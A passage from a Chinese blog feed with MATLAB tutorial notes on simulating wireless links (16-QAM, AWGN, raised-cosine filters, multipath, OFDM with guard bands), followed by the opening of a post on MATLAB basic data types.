demodOut);</span><br></pre></td></tr></table></figure><p>我们可以得到下面的<strong>理想的</strong>星座图：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120110708105.png" alt="image-20220120110708105"  /></p><p>这是最理想的星座图，各个点之间的间隔越大，他们的性能越好。最终<code>check</code>变量的值也是1，这是因为我们的通道是无噪声的理想通道，现实中肯定不是这样的了。</p><h3 id="模拟加性高斯白噪声通道">模拟加性高斯白噪声通道</h3><p>所以下来我们将通道改为包含了<strong>加性高斯白噪声(additive WhiteGauss Noise, AWGN)</strong>的环境，如下图所示：</p><p><imgsrc="https://matlabacademy-content.mathworks.com/4.35.1/R2021b/content/Communications/Basic%20Link%20Simulation/Add%20Noise/images/diagram2_QAMlinkwithAWGN-01.svg" /></p><p>我们修改一下代码，设置信号平均功率(Average Power)为1，并对调制的结果添加高斯白噪声，最终我们看一下两个图的对比。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], <span class="number">20000</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(modOut);</span><br><span class="line">title(<span class="string">&quot;Without Noise&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加性高斯白噪声 %</span></span><br><span class="line">SNR = <span class="number">15</span>; <span class="comment">% dB</span></span><br><span class="line">chanOut = awgn(modOut, SNR);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(chanOut);</span><br><span class="line">title(<span class="string">&quot;AWGN&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解调 %</span></span><br><span class="line">demodOut = qamdemod(chanOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 检查 %</span></span><br><span class="line">check = <span class="built_in">isequal</span>(srcBits, demodOut);</span><br></pre></td></tr></table></figure><p>此时我们再对比一下，噪声的影响就出来了。只有在原来理想(ideal)位置(左图位置)上的点才会被解调为正常的比特，而不在理想位置上、发生了偏移的点则就会发生解调错误。</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120112520154.png" alt="image-20220120112520154"  /></p><p>当然，我们可以提高信噪比，来看看效果，下图是SNR分别为30、60、100的结果，可以看到结果是越来越好了。</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120113335035.png" alt="image-20220120113335035"  /></p><p>当然看星座图是一种方法了，我们接下来量化一下，使用比特错误率(BitError Rate, BER)来衡量。</p><h3 id="计算误比特率">计算误比特率</h3><p>计算方法很简单，我们只需要使用错误的比特数量除以总比特数就可以了，我们使用<code>~=</code>符号来获得一个向量，其中1代表运算的两个对象包含的元素不相同，0代表相同，故<code>srcBits ~= demodOut</code>就可以将错误的比特标记为1，然后我们使用<code>nnz</code>即non-zero函数来对这些标记进行Counting，最后做比值就可以了。代码如下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">numBits = <span class="number">20000</span>;</span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], numBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(modOut);</span><br><span class="line">title(<span class="string">&quot;Without Noise&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加性高斯白噪声 %</span></span><br><span class="line">SNR = <span class="number">15</span>; <span class="comment">% dB</span></span><br><span class="line">chanOut = awgn(modOut, SNR);</span><br><span class="line"><span class="comment">% 查看星座图 %</span></span><br><span class="line">scatterplot(chanOut);</span><br><span class="line">title(<span class="string">&quot;AWGN&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解调 %</span></span><br><span class="line">demodOut = qamdemod(chanOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 计算误比特率 %</span></span><br><span class="line">numErrorBits = nnz(srcBits ~= demodOut);</span><br><span class="line">BER = numErrorBits / numBits;</span><br></pre></td></tr></table></figure><h3 id="模拟滤波器">模拟滤波器</h3><p>为了降低上述出现的误比特率，我们将使用滤波器(filter)，加上滤波器的发送方和接收方如下所示，通常上这一对过滤器是匹配使用的。下面实验我们使用一个平方根升余弦过滤器函数来实现功能，具体函数为<code>comm.RaisedCosineTransmitFilter</code>和<code>comm.RaisedCosineReceiveFilter</code>，然后我们对比一下加了过滤器后的误码率。代码如下。</p><p><img src="/img/MATLAB - Wireless Communication Onramp/diagram4_txrxfilters-01.svg" style="zoom:33%;" /></p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">numBits = <span class="number">20000</span>;</span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], numBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 添加升余弦过滤器 %</span></span><br><span class="line">txFilt = comm.RaisedCosineTransmitFilter;</span><br><span class="line"><span class="comment">% 通过过滤器 %</span></span><br><span class="line">txFiltOut = txFilt(modOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 加性高斯白噪声 注意，这里降低了SNR%</span></span><br><span class="line">SNR = <span class="number">7</span>; <span class="comment">% db</span></span><br><span class="line"><span class="comment">% measured 代表根据SNR缩放噪声功率</span></span><br><span class="line">chanOut = awgn(txFiltOut, SNR, <span class="string">&quot;measured&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 添加升余弦过滤器 %</span></span><br><span class="line">rxFilt = comm.RaisedCosineReceiveFilter;</span><br><span class="line"><span class="comment">% 通过过滤器 %</span></span><br><span class="line">rxFiltOut = rxFilt(chanOut);</span><br></pre></td></tr></table></figure><p>我们可以通过功率谱来分析一下通过滤波器后，没有经过噪声通道和经过噪声通道的频谱图，首先我们通过<code>dsp.SpectrumAnalyzer</code>函数新创建一个频谱分析对象，然后进行分析，在上述代码后面添加如下代码即可：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">specAn = dsp.SpectrumAnalyzer(...</span><br><span class="line">    <span class="string">&quot;NumInputPorts&quot;</span>,<span class="number">2</span>, ...</span><br><span class="line">    <span class="string">&quot;SpectralAverages&quot;</span>,<span class="number">50</span>);</span><br><span class="line">specAn(txFiltOut,chanOut)</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220120141841020.png" alt="image-20220120141841020"  /></p><p>其中黄色的部分是没有通过噪声通道前的样子，蓝色是通过噪声通道后的样子，</p><p>由于滤波器是存在延迟的，其长度为滤波器的一半，其单位为符号，所以在计算误码率之前，我们需要对原始的数据和解调前的数据进行对齐，在上面添加如下具体代码：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delayInSymbols = rxFilt.FilterSpanInSymbols/<span class="number">2</span> + txFilt.FilterSpanInSymbols/<span class="number">2</span></span><br><span class="line">delayInBits = delayInSymbols * bitsPerSymbol</span><br><span class="line">srcAligned = srcBits(<span class="number">1</span>:(<span class="keyword">end</span>-delayInBits))</span><br><span class="line">demodAligned = demodOut((delayInBits+<span class="number">1</span>):<span class="keyword">end</span>)</span><br><span class="line">numBitErrors = nnz(srcAligned ~= demodAligned)</span><br><span class="line">BER = numBitErrors / <span class="built_in">length</span>(srcAligned)</span><br></pre></td></tr></table></figure><p>从我自己多次的运行结果来看，在和上一节中<code>SNR=15</code>对比，这里虽然将SNR降低到了7，但是其误码率反而要比上一节的实验结果将近小了2至倍，这说明滤波器在对抗噪声方面的作用是显著的。</p><h2 id="模拟多径通信链路">模拟多径通信链路</h2><blockquote><p>无线通信如LTE、5G、Wifi本身就是在开放式的环境中以广播的形式进行传输，故为了更好的模拟无线通信环境，我们需要对多径通信链路进行仿真实验。</p></blockquote><h3 id="基本建模以及问题">基本建模以及问题</h3><p>下面将模拟一个发送方和接收方都是静态情况(不移动)下的多径通信链路，如下图所示：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/diagram5_multipath-01.svg" /></p><p>首先我们使用一个有限脉冲响应过滤器(finite impulse response(FIR)filter)来代表多路径，通常上是有一个由系数组成的向量：<code>b = [b0 b1 b2 ... bn]</code>，我们可以认为每一个元素为一个路径，每一个非0系数代表延迟。下面的代码中我们用变量<code>mpChan</code>来模拟一个多径。依旧采用单数据源发送数据，前面的数据生成过程和最后的BER计算方法和上一节相同。</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 创建一个信源，使用randi %</span></span><br><span class="line">numBits = <span class="number">20000</span>;</span><br><span class="line">srcBits = randi([<span class="number">0</span>, <span class="number">1</span>], numBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 使用16-QAM进行调制和解调 %</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">bitsPerSymbol = <span class="built_in">log2</span>(modOrder);</span><br><span class="line">modOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"><span class="comment">% 添加升余弦过滤器 %</span></span><br><span class="line">txFilt = comm.RaisedCosineTransmitFilter;</span><br><span class="line">rxFilt = comm.RaisedCosineReceiveFilter;</span><br><span class="line"><span class="comment">% 通过过滤器 %</span></span><br><span class="line">txFiltOut = txFilt(modOut);</span><br><span class="line"></span><br><span class="line">spacing = <span class="built_in">zeros</span>(<span class="number">7</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 多径通道 %</span></span><br><span class="line">mpChan = [<span class="number">0.8</span>; spacing; <span class="number">-0.5</span>; spacing; <span class="number">0.34</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">% stem 可以查看 %</span></span><br><span class="line"><span class="comment">% stem(mpChan) %</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% apply the filter to signal %</span></span><br><span class="line">mpChanOut = filter(mpChan, <span class="number">1</span>, txFiltOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% BER %</span></span><br><span class="line"><span class="keyword">if</span> exist(<span class="string">&quot;mpChanOut&quot;</span>,<span class="string">&quot;var&quot;</span>)</span><br><span class="line">    SNR = <span class="number">15</span>;  <span class="comment">% dB</span></span><br><span class="line">    chanOut = awgn(mpChanOut,SNR,<span class="string">&quot;measured&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    rxFiltOut = rxFilt(chanOut);</span><br><span class="line">    scatterplot(rxFiltOut)</span><br><span class="line">    title(<span class="string">&quot;Receive Filter Output&quot;</span>)</span><br><span class="line">    demodOut = qamdemod(rxFiltOut,modOrder,<span class="string">&quot;OutputType&quot;</span>,<span class="string">&quot;bit&quot;</span>, ...</span><br><span class="line">        <span class="string">&quot;UnitAveragePower&quot;</span>,<span class="built_in">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">% Calculate the BER</span></span><br><span class="line">    delayInSymbols = txFilt.FilterSpanInSymbols/<span class="number">2</span> + ...</span><br><span class="line">        rxFilt.FilterSpanInSymbols/<span class="number">2</span>;</span><br><span class="line">    delayInBits = delayInSymbols * bitsPerSymbol;</span><br><span class="line">    srcAligned = srcBits(<span class="number">1</span>:(<span class="keyword">end</span>-delayInBits));</span><br><span class="line">    demodAligned = demodOut((delayInBits+<span class="number">1</span>):<span class="keyword">end</span>);</span><br><span class="line"></span><br><span class="line">    numBitErrors = nnz(srcAligned~=demodAligned);</span><br><span class="line">    BER = numBitErrors/<span class="built_in">length</span>(srcAligned);</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122135303062.png" alt="image-20220122135303062"  /></p><p>从实验结果来看，在SNR为15的情况下，误比特率高达20%以上，从星座图来看显然几乎是不可用的传输方案，下面是频谱图：</p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122135829367.png" alt="image-20220122135829367"  /></p><p>其中蓝色代表多径通道的输出，黄色是调制后的输出，可以从结果看到，多径通道输出后中间有明显的凹陷，扭曲了原信号的波形，这是因为<strong>频率选择性多径（frequency-selectivemultipath）导致信道衰减或增益的水平取决于频率。</strong>针对这个问题，在wifi、5G、LTE中，我们使用正交频分多路复用技术(orthogonalfrequency-division multiplexing,OFDM)来解决。所以我们下来模拟该技术。</p><h3 id="引入ofdm">引入OFDM</h3><p><img src="/img/MATLAB - Wireless Communication Onramp/diagram7_ofdmmod_equalizer-01.svg"  /></p><p>这里不展开说具体原理，这里直接使用Matlab的OFDM的实现函数就可以了。代码如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 16-QAM</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">bitsPerSymbol = <span class="built_in">log2</span>(modOrder);</span><br><span class="line"></span><br><span class="line"><span class="comment">% multipath channel</span></span><br><span class="line">mpChan = [<span class="number">0.8</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">-0.5</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">0.34</span>];  </span><br><span class="line">SNR = <span class="number">15</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% number of subcarriers</span></span><br><span class="line">numCarr = <span class="number">8192</span>;</span><br><span class="line">numBits = numCarr * bitsPerSymbol;</span><br><span class="line">srcBits = randi([<span class="number">0</span>,<span class="number">1</span>],numBits,<span class="number">1</span>);</span><br><span class="line">qamModOut = qammod(srcBits,modOrder,<span class="string">&quot;InputType&quot;</span>,<span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>,<span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 设定前缀长度</span></span><br><span class="line">cycPrefLen = <span class="number">32</span>;</span><br><span class="line"><span class="comment">% OFDM调制</span></span><br><span class="line">ofdmModOut = ofdmmod(qamModOut, numCarr, cycPrefLen);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 多路径+AWGN</span></span><br><span class="line">mpChanOut = filter(mpChan,<span class="number">1</span>,ofdmModOut);</span><br><span class="line">chanOut = awgn(mpChanOut,SNR,<span class="string">&quot;measured&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% OFDM解调</span></span><br><span class="line">ofdmDemodOut = ofdmdemod(chanOut, numCarr, cycPrefLen);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 均衡器</span></span><br><span class="line">mpChanFreq = fftshift(fft(mpChan, numCarr));</span><br><span class="line">eqOut = ofdmDemodOut ./ mpChanFreq;</span><br><span class="line">scatterplot(eqOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 16-QAM解码</span></span><br><span class="line">qamDemodOut = qamdemod(eqOut,modOrder,<span class="string">&quot;OutputType&quot;</span>,<span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>,<span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 计算BER</span></span><br><span class="line">numBitErrors = nnz(srcBits~=qamDemodOut);</span><br><span class="line">BER = numBitErrors/numBits;</span><br></pre></td></tr></table></figure><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122160032483.png" alt="image-20220122160032483"  /></p><p>从实验结果来看，使用了OFDM技术的情况下，多径效应的影响被大大减弱了。</p><h3 id="添加防护带">添加防护带</h3><blockquote><p>为了防止信号之间的相互干扰，在实际的OFDM系统中往往需要防护带的设计(如下图所示)，同时去除直流部分以便在没有直流的信号上使用。上述操作同样可以使用<code>ofdmmod</code>函数完成</p><p><img src="https://matlabacademy-content.mathworks.com/4.35.1/R2021b/content/Communications/OFDM/Null%20Subcarriers/images/nullsubcarriers.svg" alt="33 OFDM subcarriers. Left four and right four subcarriers are guard bands, center subcarrier is null DC." style="zoom:80%;" /></p></blockquote><p>代码如下：</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">% 16-QAM</span></span><br><span class="line">modOrder = <span class="number">16</span>;</span><br><span class="line">bitsPerSymbol = <span class="built_in">log2</span>(modOrder);</span><br><span class="line"><span class="comment">% multipath channel</span></span><br><span class="line">mpChan = [<span class="number">0.8</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">-0.5</span>; <span class="built_in">zeros</span>(<span class="number">7</span>,<span class="number">1</span>); <span class="number">0.34</span>];  </span><br><span class="line">SNR = <span class="number">15</span>;</span><br><span class="line"><span class="comment">% number of subcarriers</span></span><br><span class="line">numCarr = <span class="number">8192</span>;</span><br><span class="line"><span class="comment">% cycPrefLen</span></span><br><span class="line">cycPrefLen = <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">% indices of left and right band Guard</span></span><br><span class="line">numGBCarr = numCarr/<span class="number">16</span>;</span><br><span class="line">leftBg = <span class="number">1</span>:numGBCarr;</span><br><span class="line">rightBg = (numCarr - numGBCarr + <span class="number">1</span>):numCarr;</span><br><span class="line">dcIdx = numCarr/<span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">nullIdx = [leftBg dcIdx rightBg]&#x27;;</span><br><span class="line"></span><br><span class="line"><span class="comment">% data carries</span></span><br><span class="line">numDataCarr = numCarr - <span class="built_in">length</span>(nullIdx);</span><br><span class="line">numDataBits = numDataCarr * bitsPerSymbol;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 生成源数据</span></span><br><span class="line">srcBits = randi([<span class="number">0</span>,<span class="number">1</span>], numDataBits, <span class="number">1</span>);</span><br><span class="line"><span class="comment">% 16-QAM编码</span></span><br><span class="line">qamModOut = qammod(srcBits, modOrder, <span class="string">&quot;InputType&quot;</span>, <span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% ofdm编码</span></span><br><span class="line">ofdmModOut = ofdmmod(qamModOut, numCarr, cycPrefLen, nullIdx);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 通过AWGN的多径通道</span></span><br><span class="line">mpChanOut = filter(mpChan,<span class="number">1</span>,ofdmModOut);</span><br><span class="line">chanOut = awgn(mpChanOut,SNR,<span class="string">&quot;measured&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% ofdm解调</span></span><br><span class="line">ofdmDemodOut = ofdmdemod(chanOut, numCarr, cycPrefLen, cycPrefLen, nullIdx);</span><br><span class="line"><span class="comment">% 均衡信号</span></span><br><span class="line">mpChanFreq = fftshift(fft(mpChan, numCarr));</span><br><span class="line">mpChanFreq(nullIdx) = [];</span><br><span class="line">eqOut = ofdmDemodOut ./ mpChanFreq;</span><br><span class="line">scatterplot(eqOut);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 16-QAM解码</span></span><br><span class="line">qamDemodOut = qamdemod(eqOut, modOrder, <span class="string">&quot;OutputType&quot;</span>, <span class="string">&quot;bit&quot;</span>,...</span><br><span class="line">    <span class="string">&quot;UnitAveragePower&quot;</span>, <span class="built_in">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">% 计算误比特率</span></span><br><span class="line">numBitErrors = nnz(srcBits~=qamDemodOut);</span><br><span class="line">BER = numBitErrors/numDataBits;</span><br><span class="line"></span><br><span class="line"><span class="comment">% 频谱分析</span></span><br><span class="line">specAn = dsp.SpectrumAnalyzer(<span class="string">&quot;NumInputPorts&quot;</span>,<span class="number">2</span>,<span class="string">&quot;SpectralAverages&quot;</span>,<span class="number">50</span>);</span><br><span class="line">specAn(ofdmModOut,chanOut)</span><br></pre></td></tr></table></figure><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122215533105.png" alt="image-20220122215533105"  /></p><p><img src="/img/MATLAB - Wireless Communication Onramp/image-20220122215549567.png" alt="image-20220122215549567"  /></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;失踪人口回归嘿嘿。最近出于实验需求，学习一下如何使用Matlab来模拟无线通信环境，包括通过添加噪声、过滤器等来模拟真实物理世界状态，旨在测试信道的误比特率。包括单链路和多链路的模拟。记录的内容主要来自官网MathWork上的在线免费课程。包括：&lt;/p&gt;
&lt;ol type=&quot;1&quot;&gt;
&lt;li&gt;单理想通道&amp;amp;噪声通道通信模拟&lt;/li&gt;
&lt;li&gt;多径理想&amp;amp;噪声模拟，OFDM机制模拟&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;(ps：之前一直认为Matlab没啥用&amp;amp;&amp;amp;没好好学的我对不起对不起对不起。&lt;/p&gt;
&lt;p&gt;&lt;img
src=&quot;/img/MATLAB%20-%20Wireless%20Communication%20Onramp/image-20220122214915003.png&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="MATLAB" scheme="https://lzwgiter.github.io/categories/MATLAB/"/>
    
    
    <category term="MatLab" scheme="https://lzwgiter.github.io/tags/MatLab/"/>
    
  </entry>
  
  <entry>
    <title>Matlab编程基础</title>
    <link href="https://lzwgiter.github.io/posts/3041f265.html"/>
    <id>https://lzwgiter.github.io/posts/3041f265.html</id>
    <published>2022-01-19T11:01:02.000Z</published>
    <updated>2023-01-02T16:42:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学习一下使用MatLab如何进行编程，如函数、类、变量定义等，有助于实际MatLab项目的开发。</p><figure><img src="/img/Matlab编程基础/image-20220124190817431.png"alt="基本数据类型" /><figcaption aria-hidden="true">基本数据类型</figcaption></figure></blockquote><span id="more"></span><h1 id="基本数据类型">基本数据类型</h1><p>不管啥子编程语言，咱先了解人家的基本数据类型：</p><figure><img src="/img/Matlab编程基础/image-20220124190817431.png"alt="基本数据类型" /><figcaption aria-hidden="true">基本数据类型</figcaption></figure><p>从上图中可以看到有如下的数据类型：</p><ul><li><p>数字型：int8<sub>int64、uint8</sub>uint64、single、double</p></li><li><p>布尔型</p></li><li><p>集合型</p></li><li><p>文本型：string、char、cell</p></li><li><p>异构(Heterogeneous)型：timetable、structure、table、cell</p></li><li><p>函数型</p></li><li><p>时间型：datetime、duration、calendarDuration</p></li></ul><p>其中，对于保存了同一种类型数据的数组我们称为同构(homogeneous)数据、反之为异构(heterogeneous)数据。这里着重说一下<code>table</code>、<code>structure</code>、<code>cell</code>三个数据结构。<code>table</code>和数据库里的表是一样的，同列数据类型相同，如下图所示：</p><p><img src="/img/Matlab编程基础/image-20220124221353034.png" /></p><p><code>cell</code>与<code>table</code>类似，但是没有限制每一列数据类型相同，即每一个单元的数据类型都可以不同，可以理解为一个没有指定单元类型的数组。</p><p><img src="/img/Matlab编程基础/image-20220124221540851.png" /></p><p><code>structure</code>更好理解，就是包含了多种数据类型、用以描述一个具体的数据类型的数据结构，和C语言是一样的，和Java的类差不多。</p><p><img src="/img/Matlab编程基础/image-20220124221642251.png" /></p><h2 id="文本型数据常用函数">文本型数据常用函数</h2><ol type="1"><li><p>contains</p></li><li><p>erase</p></li><li><p>字符连接</p></li><li><p>replace</p></li></ol><h2 id="表型数据常用函数">表型数据常用函数</h2><ol type="1"><li>创建一个表</li></ol><figure class="highlight matlab"><table><tr><td 